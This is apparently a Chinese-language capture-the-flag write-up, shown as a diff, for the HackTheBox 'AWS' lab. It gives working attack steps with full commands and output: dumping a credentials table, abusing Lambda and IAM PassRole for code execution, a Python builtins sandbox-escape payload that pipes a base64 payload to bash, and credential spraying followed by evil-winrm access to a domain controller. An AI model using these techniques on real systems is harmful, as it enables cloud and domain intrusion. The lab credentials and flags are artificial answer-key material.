+        - PolicyName: lambda-policy
+          PolicyDocument:
+            Version: 2012-10-17
+            Statement:
+              - Effect: Allow
+                Action:
+                  - 'Lambda:CreateFunction'
+                  - 'Lambda:InvokeFunction'
+                  - 'IAM:PassRole'
+                Resource: ['arn:aws:lambda:*:*:function:*','arn:aws:iam::*:role/serviceadm']
+  RebeccaUser:
+    Type: 'AWS::IAM::User'
+    Properties:
+      UserName: rebecca
+      Path: /
+      Policies:
+        - PolicyName: apigw-policy
+          PolicyDocument:
+            Version: 2012-10-17
+            Statement:
+              - Effect: Allow
+                Action:
+                  - 'ApiGateway:GetRestApis'
+                Resource: '*'
+  RoyUser:
+    Type: 'AWS::IAM::User'
+    Properties:
+      UserName: roy
+      Path: /
+      Policies:
+        - PolicyName: inventory-policy
+          PolicyDocument:
+            Version: 2012-10-17
+            Statement:
+              - Effect: Allow
+                Action:
+                  - 'S3:ListBucket'
+                  - 'S3:GetObject'
+                  - 'S3:PutObject'
+                Resource: ['arn:aws:s3:::assets','arn:aws:s3:::assets/*']
+              - Effect: Allow
+                Action:
+                  - 'SNS:ListTopics'
+                  - 'SNS:Subscribe'
+                  - 'SNS:Publish'
+                Resource: '*'
+  ServiceRole:
+    Type: 'AWS::IAM::Role'
+    Properties:
+      RoleName: serviceadm
+      Path: /
+      AssumeRolePolicyDocument:
+        Version: "2012-10-17"
+        Statement:
+          - Effect: Allow
+            Principal:
+              Service:
+                - lambda.amazonaws.com
+            Action:
+              - 'sts:AssumeRole'
+      Policies:
+        - PolicyName: root
+          PolicyDocument:
+            Version: 2012-10-17
+            Statement:
+              - Effect: Allow
+                Action:
+                  - 'IAM:AttachUserPolicy'
+                Resource: 'arn:aws:iam::*:user/*'
+  Assets:
+    Type: AWS::S3::Bucket
+    Properties:
+      BucketName: !Join
+        - "-"
+        - - "assets"
+          - !Select
+            - 0
+            - !Split
+              - "-"
+              - !Select
+                - 2
+                - !Split
+                  - "/"
+                  - !Ref "AWS::StackId"
+  Databases:
+    Type: AWS::S3::Bucket
+    Properties:
+      BucketName: !Join
+        - "-"
+        - - "databases"
+          - !Select
+            - 0
+            - !Split
+              - "-"
+              - !Select
+                - 2
+                - !Split
+                  - "/"
+                  - !Ref "AWS::StackId"
+  Products:
+    Type: AWS::S3::Bucket
+    Properties:
+      BucketName: !Join
+        - "-"
+        - - "products"
+          - !Select
+            - 0
+            - !Split
+              - "-"
+              - !Select
+                - 2
+                - !Split
+                  - "/"
+                  - !Ref "AWS::StackId"
+  Releases:
+    Type: AWS::S3::Bucket
+    Properties:
+      BucketName: !Join
+        - "-"
+        - - "2022-releases"
+          - !Select
+            - 0
+            - !Split
+              - "-"
+              - !Select
+                - 2
+                - !Split
+                  - "/"
+                  - !Ref "AWS::StackId"                  
+  Clients:
+    Type: AWS::S3::Bucket
+    Properties:
+      BucketName: !Join
+        - "-"
+        - - "clients"
+          - !Select
+            - 0
+            - !Split
+              - "-"
+              - !Select
+                - 2
+                - !Split
+                  - "/"
+                  - !Ref "AWS::StackId"                  
+  OTP:
+    Type: AWS::SNS::Topic
+    Properties: 
+      DisplayName: otp
+      TopicName: otp              
+  SensorQueue:
+    Type: AWS::SQS::Queue
+    Properties: 
+      QueueName: sensor_updates
+```
+
+</details>
+
+在其中可以确定 `users` 表的存在
+
+```shell
+┌──(randark㉿kali)-[~]
+└─$ aws --endpoint-url http://cloud.amzcorp.local dynamodb scan --table-name users
+{
+    "Items": [
+        {
+            "password": {
+                "S": "dE2*5$fG"
+            },
+            "username": {
+                "S": "jason"
+            }
+        },
+        {
+            "password": {
+                "S": "cGh#@0_gJ"
+            },
+            "username": {
+                "S": "david"
+            }
+        },
+        {
+            "password": {
+                "S": "dF4G0982#4%!"
+            },
+            "username": {
+                "S": "olivia"
+            }
+        }
+    ],
+    "Count": 3,
+    "ScannedCount": 3,
+    "ConsumedCapacity": null
+}
+```
+
+得到了三对凭据
+
+在先前从 `http://jobs.amzcorp.local/api/v4/status` 获取的主机中，有一个 `workflow.amzcorp.local` 还没有测试过
+
+![img](img/image_20260426-232603.png)
+
+使用获得的凭据进行测试，使用 `olivia:dF4G0982#4%!` 成功登录
+
+![img](img/image_20260428-232837.png)
+
+在变量中，可以获取到一对新的 AWS AKSK 凭据
+
+![img](img/image_20260429-232958.png)
+
+```json
+{
+    "AWS_ACCESS_KEY_ID": "AKIA5M34BDN8GCJGRFFB",
+    "AWS_SECRET_ACCESS_KEY": "cnVpO1/EjpR7pger+ELweFdbzKcyDe+5F3tbGOdn"
+}
+```
+
+重新配置 `awdcli`
+
+```shell
+┌──(randark㉿kali)-[~]
+└─$ aws configure
+AWS Access Key ID [****************QDFP]: AKIA5M34BDN8GCJGRFFB
+AWS Secret Access Key [****************0Rue]: cnVpO1/EjpR7pger+ELweFdbzKcyDe+5F3tbGOdn
+Default region name [us-east-1]: 
+Default output format [None]: 
+```
+
+然后获取认证信息
+
+```shell
+
+┌──(randark㉿kali)-[~]
+└─$ aws --endpoint-url http://cloud.amzcorp.local sts get-caller-identity | jq
+{
+  "UserId": "AKIAIOSFODNN7DXV3G29",
+  "Account": "000000000000",
+  "Arn": "arn:aws:iam::000000000000:user/will"
+}
+```
+
+根据先前的 yml 配置信息，可以确定这对 AWS AKSK 具有 Lambda 函数相关的权限
+
+```plaintext
+lambda:CreateFunction 
+lambda:InvokeFunction 
+iam:PassRole 
+```
+
+:::warning
+
+权限过期的速度很快，每一次申请 `serviceadm` 权限，最快的方式就是创建一个 lambada
+
+:::
+
+先创建一个 `rce.py`
+
+```python
+import os
+
+def lambda_handler(event, context):
+    return os.popen("id").read()
+```
+
+将其打包并创建函数
+
+```shell
+┌──(randark㉿kali)-[~/tmp/HTB_AWS]
+└─$ zip rce.zip rce.py
+  adding: rce.py (deflated 6%)
+
+┌──(randark㉿kali)-[~/tmp/HTB_AWS]
+└─$ aws --endpoint-url http://cloud.amzcorp.local lambda create-function --function-name rce --runtime python3.8 --role "arn:aws:iam::000000000000:role/serviceadm" --handler rce.lambda_handler --zip-file fileb://rce.zip | jq
+{
+  "FunctionName": "rce",
+  "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:rce",
+  "Runtime": "python3.8",
+  "Role": "arn:aws:iam::000000000000:role/serviceadm",
+  "Handler": "rce.lambda_handler",
+  "CodeSize": 237,
+  "Description": "",
+  "Timeout": 3,
+  "LastModified": "2026-04-11T15:34:23.828+0000",
+  "CodeSha256": "TTptBmZJGvcnoS3cB8VTPEVbFsDnkZCoNgZnhV0Ew+k=",
+  "Version": "$LATEST",
+  "VpcConfig": {},
+  "TracingConfig": {
+    "Mode": "PassThrough"
+  },
+  "RevisionId": "25be8f05-a7e5-4342-864b-edee8e5000c5",
+  "State": "Active",
+  "LastUpdateStatus": "Successful",
+  "PackageType": "Zip"
+}
+```
+
+先尝试枚举一下可以使用的命令
+
+```shell
+┌──(randark㉿kali)-[~/tmp/HTB_AWS]
+└─$ aws --endpoint-url http://cloud.amzcorp.local lambda list-functions | jq
+{
+  "Functions": [
+    {
+      "FunctionName": "tracking_api",
+      "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:tracking_api",
+      "Runtime": "python3.8",
+      "Role": "arn:aws:iam::123456:role/irrelevant",
+      "Handler": "code.lambda_handler",
+      "CodeSize": 662,
+      "Description": "",
+      "Timeout": 3,
+      "LastModified": "2026-04-10T13:06:31.385+0000",
+      "CodeSha256": "HIkPHSeYh4DIQb5LaRF3ln8QjuajegZJsEyK8tCcxrU=",
+      "Version": "$LATEST",
+      "VpcConfig": {},
+      "TracingConfig": {
+        "Mode": "PassThrough"
+      },
+      "RevisionId": "0d1f34ed-f3cf-4664-aada-0164efe55443",
+      "State": "Active",
+      "LastUpdateStatus": "Successful",
+      "PackageType": "Zip"
+    }
+  ]
+}
+```
+
+获取 `tracking_api` 的信息
+
+```shell
+┌──(randark㉿kali)-[~/tmp/HTB_AWS]
+└─$ aws --endpoint-url http://cloud.amzcorp.local lambda get-function --function-name tracking_api | jq
+{
+  "Configuration": {
+    "FunctionName": "tracking_api",
+    "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:tracking_api",
+    "Runtime": "python3.8",
+    "Role": "arn:aws:iam::123456:role/irrelevant",
+    "Handler": "code.lambda_handler",
+    "CodeSize": 662,
+    "Description": "",
+    "Timeout": 3,
+    "LastModified": "2026-04-10T13:06:31.385+0000",
+    "CodeSha256": "HIkPHSeYh4DIQb5LaRF3ln8QjuajegZJsEyK8tCcxrU=",
+    "Version": "$LATEST",
+    "VpcConfig": {},
+    "TracingConfig": {
+      "Mode": "PassThrough"
+    },
+    "RevisionId": "0d1f34ed-f3cf-4664-aada-0164efe55443",
+    "State": "Active",
+    "LastUpdateStatus": "Successful",
+    "PackageType": "Zip"
+  },
+  "Code": {
+    "Location": "http://172.22.192.2:4566/2015-03-31/functions/tracking_api/code"
+  },
+  "Tags": {}
+}
+```
+
+但是很明显，这个下载链接位于内网，如果尝试直接从外部下载的话
+
+```shell
+┌──(randark㉿kali)-[~/tmp/HTB_AWS]
+└─$ curl http://cloud.amzcorp.local/2015-03-31/functions/tracking_api/code
+<ErrorResponse xmlns="https://iam.amazonaws.com/doc/2010-05-08/">
+                        <Error>
+                                <Type>Sender</Type>
+                                <Code>InvalidClientTokenId</Code>
+                                <Message>The security token included in the request is invalid</Message>
+                        </Error>
+                        <RequestId>e9110237-adc4-11e6-92e0-8b00d85af153</RequestId>
+                </ErrorResponse>
+```
+
+需要凭据的话，最快的方法，就是抓包，然后修改请求的路径进行重放
+
+```plaintext
+GET /2015-03-31/functions/tracking_api/code HTTP/1.1
+
+Host: cloud.amzcorp.local
+
+Accept-Encoding: gzip, deflate, br
+
+User-Agent: aws-cli/2.31.35 md/awscrt#1.0.0.dev0 ua/2.1 os/linux#6.12.38+kali-amd64 md/arch#x86_64 lang/python#3.13.7 md/pyimpl#CPython m/E,N,b,Z,n cfg/retry-mode#standard md/installer#source md/distrib#kali.2025 md/prompt#off md/command#lambda.get-function
+
+X-Amz-Date: 20260411T154233Z
+
+Authorization: AWS4-HMAC-SHA256 Credential=AKIA5M34BDN8GCJGRFFB/20260411/us-east-1/lambda/aws4_request, SignedHeaders=host;x-amz-date, Signature=4a55311e576df080b91446637a059a8c36f12b78852d6e1c61a1b4b3e1713cda
+
+Connection: keep-alive
+```
+
+得到了一份 zip 压缩包，里面含有 `code.py` 和  `fl;ag.txt` 两个文件
+
+```python title="code.py"
+import json
+from urllib.parse import unquote
+def lambda_handler(event, context):
+    try:
+        tracking_id = event['queryStringParameters']['id']
+        tid = "id : '{}'"
+        exec(tid.format(unquote(unquote(tracking_id))),{"__builtins__": {}}, {})
+        # ToDo : Integrate with graphql in Q4 
+        if tid:
+            return {
+                'statusCode': 200,
+                'body': json.dumps('Internal Server Error')
+            }
+    except Exception as e:
+        return {
+            'statusCode': 500,
+            'body': json.dumps(f'Invalid Tracking ID. {e}')
+        }
+```
+
+## flag - 07
+
+```plaintext title="Flag"
+AWS{i4m_w3ll_bu1lt_w1th0ut_bu1lt1ns}
+```
+
+## Line Up
+
+上文中得到了 `tracking_api` 这个 function 的源码，对其进行分析后，可以发现，只需要将 `id` 尝试使用单引号进行闭合，就能尝试进行 RCE 攻击
+
+```python
+nano payload.json
+
+#Dentro del nano
+{
+  "queryStringParameters": {
+    "id": "1';a = [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('echo <base64 payload> | base64 -d | bash'); b = 'a"
+  }
+}
+```
+
+:::warning
+
+截至 2026 年 04 月 13 日，环境存在有交互问题，这一部分转载自其他 Writeup 源
+
+- [Writeup HackTheBox AWS - xchg2pwn](https://xchg2pwn.github.io/fortresses/aws/)
+- [HackTheBox Aws Writeup :: X3ric Blog](https://blog.x3ric.com/posts/HackTheBox-Aws/)
+- [ctf/Hackthebox/Soluciones/fortresses/AWS/Tutorial/tut1/index2.md at 87507e510aea6c347355fe86bb02a10d700aff04 · apuromafo/ctf](https://github.com/apuromafo/ctf/blob/87507e510aea6c347355fe86bb02a10d700aff04/Hackthebox/Soluciones/fortresses/AWS/Tutorial/tut1/index2.md)
+
+:::
+
+这里有两条路，分别是创建自定义的 lambda 函数，然后执行 RCE Payload 反弹一个 shell 回来，或者就是利用上面原有 `tracking_api` 这个 function 的漏洞
+
+反弹 shell 之后，可以直接从远程环境中的 docker 将 flag 读取出来，或者在获得 `serviceadm` 权限之后，通过
+
+```shell
+aws --endpoint-url http://cloud.amzcorp.local sqs list-queues | jq  
+```
+
+从队列中获得 flag
+
+## flag - 08
+
+```plaintext title="Flag"
+AWS{th4ts_4_l0ng_Q}
+```
+
+## Long Run
+
+针对先前得到的三对凭据，在 AD 域中进行测试
+
+```shell
+┌──(randark㉿kali)-[~]
+└─$ nxc ldap 10.13.37.15 -u olivia -p 'dF4G0982#4%!'
+LDAP        10.13.37.15     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:amzcorp.local)
+LDAP        10.13.37.15     389    DC01             [-] amzcorp.local\olivia:dF4G0982#4%! 
+
+┌──(randark㉿kali)-[~]
+└─$ nxc ldap 10.13.37.15 -u david -p 'cGh#@0_gJ'
+LDAP        10.13.37.15     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:amzcorp.local)
+LDAP        10.13.37.15     389    DC01             [+] amzcorp.local\david:cGh#@0_gJ 
+
+┌──(randark㉿kali)-[~]
+└─$ nxc ldap 10.13.37.15 -u jason -p 'dE2*5$fG'
+LDAP        10.13.37.15     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:amzcorp.local)
+LDAP        10.13.37.15     389    DC01             [-] amzcorp.local\jason:dE2*5$fG 
+```
+
+但是由于 david 没有管理员权限，所以没办法使用 `impacket` 的远程命令执行模块
+
+```shell
+┌──(randark㉿kali)-[~]
+└─$ impacket-psexec amzcorp.local/david@10.13.37.15
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+[*] Requesting shares on 10.13.37.15.....
+[-] share 'ADMIN$' is not writable.
+[-] share 'C$' is not writable.
+[-] share 'NETLOGON' is not writable.
+[-] share 'Product_Release' is not writable.
+[-] share 'SYSVOL' is not writable.
+```
+
+但是可以试试 `winrm` 协议
+
+```shell
+┌──(randark㉿kali)-[~]
+└─$ nxc winrm 10.13.37.15 -u david -p 'cGh#@0_gJ' -x whoami
+WINRM       10.13.37.15     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:amzcorp.local)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.13.37.15     5985   DC01             [+] amzcorp.local\david:cGh#@0_gJ (Pwn3d!)
+WINRM       10.13.37.15     5985   DC01             [-] Execute command failed, current user: 'amzcorp.local\david' has no 'Invoke' rights to execute command (shell type: cmd)
+WINRM       10.13.37.15     5985   DC01             [+] Executed command (shell type: powershell)
+WINRM       10.13.37.15     5985   DC01             amzcorp\david
+```
+
+使用 `evil-winrm` 进行连接
+
+```shell
+┌──(randark㉿kali)-[~]
+└─$ evil-winrm -i 10.13.37.15 -u david -p 'cGh#@0_gJ'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\david\Documents> cd ../
+*Evil-WinRM* PS C:\Users\david> dir
+
+
+    Directory: C:\Users\david
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---       12/23/2021   6:11 AM                Desktop
+d-r---       12/23/2021   6:07 AM                Documents
+d-r---        9/15/2018   3:19 AM                Downloads
+d-r---        9/15/2018   3:19 AM                Favorites
+d-r---        9/15/2018   3:19 AM                Links
+d-r---        9/15/2018   3:19 AM                Music
+d-r---        9/15/2018   3:19 AM                Pictures
+d-----        9/15/2018   3:19 AM                Saved Games
+d-r---        9/15/2018   3:19 AM                Videos
+
+
+*Evil-WinRM* PS C:\Users\david> dir Desktop
+
+
+    Directory: C:\Users\david\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       12/23/2021   6:11 AM             72 flag.txt
+```
+
+## flag - 09
+
+```plaintext title="Flag"
+AWS{h4ng_1n_th3r3_f0r_m0r3_cl0ud}
+```
+
+## Demolish
+
+从先前反弹的 shell 中，可以从远程环境中获得新的特权 AKSK 凭据，并使用这个 AKSK 可以与 s3 储存桶进行交互，并可以通过密码喷洒，成功获得 `Administrator` 权限
+
+## flag - 10
+
+```plaintext title="Flag"
+AWS{wr3ck3d_r3s1st0r}
+```
